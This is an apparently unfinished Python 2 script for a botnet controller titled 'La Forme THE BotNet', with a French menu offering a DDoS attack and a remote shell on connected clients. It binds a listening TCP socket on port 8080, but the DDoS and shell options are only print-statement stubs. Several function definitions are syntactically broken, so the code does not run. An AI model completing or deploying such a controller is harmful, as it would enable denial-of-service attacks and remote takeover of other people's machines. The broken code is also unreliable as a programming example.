import socket
import threading

print"*********************************************************"
print"*********************************************************"
print"**  _            ______                                **"
print"** | |           |  ___|                         _     **"
print"** | |     __ _  | |_ ___  _ __ _ __ ___   ___  (_)    **"
print"** | |    / _` | |  _/ _ \| '__| '_ ` _ \ / _ \        **"
print"** | |___| (_| | | || (_) | |  | | | | | |  __/  _     **"
print"** \_____/\__,_| \_| \___/|_|  |_| |_| |_|\___| (_)    **"
print"**                                                     **"
print"** _____ _   _  _____  ______       _   _   _      _   **"
print"**|_   _| | | ||  ___| | ___ \     | | | \ | |    | |  **"
print"**  | | | |_| || |__   | |_/ / ___ | |_|  \| | ___| |_ **"
print"**  | | |  _  ||  __|  | ___ \/ _ \| __| . ` |/ _ \ __|**"
print"**  | | | | | || |___  | |_/ / (_) | |_| |\  |  __/ |_ **"
print"**  \_/ \_| |_/\____/  \____/ \___/ \__\_| \_/\___|\__|**"
print"*********************************************************"
print"*********************************************************"
print"****BotNet La Forme Developpe  par: Guillaume Soares,****"
print"***********Nathan  Fievez Et Alexandre Villain***********"
print"*********************************************************"

bind_ip = "0.0.0.0" # local IP
bind_port = 8080    # port that you're locking for

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating object
server.bind((bind_ip,bind_port))  #bind called 
server.listen(5)  # 5 connections possible

def main_menu():
	print"Quel est votre choix ?"

	print"Appuyez sur 1 pour DDOS"
	print"Appuyez sur 2 pour Voir le nombre de clients et/ou ouvrir un SHELL sur l'un d'entre eux"
	print"Appuyez sur 3 pour quitter"
	choix = raw_input("")

def menu1
	print"Bienvenue sur le menu DDOS"

def menu2
	print"Bienvenue sur le menu Clients"
	print"Sur ce menu, il est possible de voir le nombre de Clients connectés et d'ouvrir un SHELL sur l'un d'entre eux"
	